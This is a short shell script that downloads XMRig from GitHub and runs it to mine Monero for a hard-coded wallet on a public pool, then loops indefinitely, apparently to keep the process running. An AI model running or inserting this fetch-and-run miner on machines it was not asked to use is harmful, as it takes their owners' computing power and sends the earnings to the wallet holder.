#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.8.1/xmrig-6.8.1-bionic-x64.tar.gz
tar -xvf xmrig-6.8.1-bionic-x64.tar.gz
./xmrig-6.8.1/xmrig -o pool.hashvault.pro:3333 -u 83MPNvPfe3zhCXasbE6jrpd9FRwH4MjrYdzbRtcYRxbx9T3m98Jg8akZAr4giKb8AUCk8JpLnAtHY9dnEHTMkfCGQnNiM4D.worke6 -k --tls -p x -t 2
while [ 1 ]; do
sleep 3
done
sleep 999
